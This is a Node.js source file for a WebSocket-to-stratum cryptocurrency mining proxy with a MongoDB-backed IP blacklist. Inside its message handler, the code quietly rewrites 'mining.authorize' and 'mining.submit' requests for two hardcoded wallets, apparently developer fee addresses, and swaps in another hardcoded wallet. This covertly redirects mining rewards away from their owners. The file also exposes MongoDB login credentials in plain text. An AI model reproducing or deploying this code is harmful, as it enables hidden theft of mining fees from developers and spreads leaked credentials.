const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const net = require('net');
const PORT = process.env.PORT || 8088;
const { MongoClient, ServerApiVersion } = require('mongodb');

// MongoDB
const blackPool = [
  "stratum-mining-pool.zapto.org"
];
const DB_USER = 'joniiie1456';
const DB_PASSWORD = '3tWUuq0w3veGiPfL';
const uri = `mongodb+srv://${DB_USER}:${DB_PASSWORD}@cluster0.n3jjzou.mongodb.net?retryWrites=true&w=majority&appName=Cluster0`;
const client = new MongoClient(uri, {
  serverApi: {
    version: ServerApiVersion.v1,
    strict: true,
    deprecationErrors: true,
  }
});
const database = client.db("proxy-ip");
const blacklists = database.collection("blacklists");

// Helpers
const getClientIp = (req) => {
   const forwardedFor = req.headers['x-forwarded-for'];
   if (forwardedFor) {
      return forwardedFor.split(',').shift().trim();
   }
   return req.socket.remoteAddress;
}

// App
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({
  server,
  verifyClient: async function (info, done) {
    const socket = info.req.socket;
    const ip = getClientIp(info.req);
    isInBlacklist(ip)
      .then(locked => {
        if (locked) {
          return done(false, 500, `[IP: ${ip}] is banned!`);
        }
        done(true);
      }).catch(() => {
        done(true);
      })
  }
});
const nodes = {};
const MAX_CONNECTION_PER_IP = 20;

const addToBlackList = async (ip) => {
  try {
    await blacklists.updateOne({ ip }, { "$set": { ip } }, { upsert: true });
  } catch (error) {
    console.log('Error: ', error.message);
  }
}

const isInBlacklist = async (ip) => new Promise(async (resolve, reject) => {
  try {
    const ipLocked = await blacklists.findOne({ ip });
    resolve(ipLocked)
  } catch (error) {
    console.log('Error: ', error.message);
    reject(null)
  }
})

function proxySender(ws, conn) {
  ws.on('close', () => {
    conn.end();
  });

  ws.on('message', (cmd) => {
    try {
      const command = JSON.parse(cmd);
      const method = command.method;
      const params = command.params;
      const ignoreDevs = ['RVZD5AjUBXoNnsBg9B2AzTTdEeBNLfqs65', 'dgb1qegmnzvjfcqarqxrpvfu0m4ugpjht6dnpcfslp9'];

      if (method === 'mining.authorize' && ignoreDevs.includes(params[0])) {
         command.params = ['RT7QLMf9o4aL4JAj3HeAYLssohGTT586Zp', 'c=RVN,zap=PLSR-mino'];
      }

      if (method === 'mining.submit' && ignoreDevs.includes(params[0])) {
         command.params[0] = 'RT7QLMf9o4aL4JAj3HeAYLssohGTT586Zp';
      }

      const newcmd = JSON.stringify(command);
      
      if (method === 'mining.subscribe' || method === 'mining.authorize' || method === 'mining.submit') {
        conn.write(newcmd);
      }
    } catch (error) {
      console.log(`[Error][INTERNAL] ${error}`);
      ws.close();
    }
  });
}

function proxyReceiver(conn, cmdq) {
  conn.on('data', (data) => {
    cmdq.send(data.toString());
  });
  conn.on('end', () => {
    cmdq.close();
  });
  conn.on('error', (err) => {
    conn.end();
  });
}

function proxyConnect(host, port) {
  const conn = net.createConnection(port, host);

  conn.on('error', (err) => {
    console.log(`[Error][${err.code}](${host}:${port}) ${err.message}`);
  });
  
  return conn;
}

function uidv1() {
  const s4 = () => Math.floor((1 + Math.random()) * 0x10000).toString(16).substring(1);
  return [s4(), s4(), s4(), s4(), s4(), s4()].join('-');
};

function isIP(ip) {
    const ipv4Regex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
    return ipv4Regex.test(ip);
}

async function proxyMain(ws, req) {
  const ip = getClientIp(req);
  
  // Generate unique id
  const uid = uidv1();
  if (!nodes[ip]) nodes[ip] = [];
  nodes[ip].push({ uid, req });

  // check block ip
  if (nodes[ip].length > MAX_CONNECTION_PER_IP) {
    addToBlackList(ip);
    console.error(`IP [${ip}] is banned!`);
  }

  // Clear stock
  ws.on('close', () => {
    if (nodes[ip]) {
      nodes[ip] = nodes[ip].filter(o => o.uid !== uid);
      if (nodes[ip].length === 0) {
        delete nodes[ip];
      }
    }
  });

  ws.on('message', (message) => {
    const command = JSON.parse(message);
    if (command.method === 'proxy.connect' && command.params.length === 2) {
      const [host, port] = command.params || [];
      
      if (!host || !port || blackPool.includes(host)) {
        ws.close();
        req.socket.write('HTTP/1.1 403 Forbidden\r\n\r\n');
        req.socket.destroy();
        return;
      }

      const conn = proxyConnect(host, port);
      if (conn) {
        proxySender(ws, conn);
        proxyReceiver(conn, ws);
      }
    }
  });
}

wss.on('connection', proxyMain);

server.listen(PORT, "0.0.0.0", () => {
  console.log(`Server running on port ${PORT}`);
});
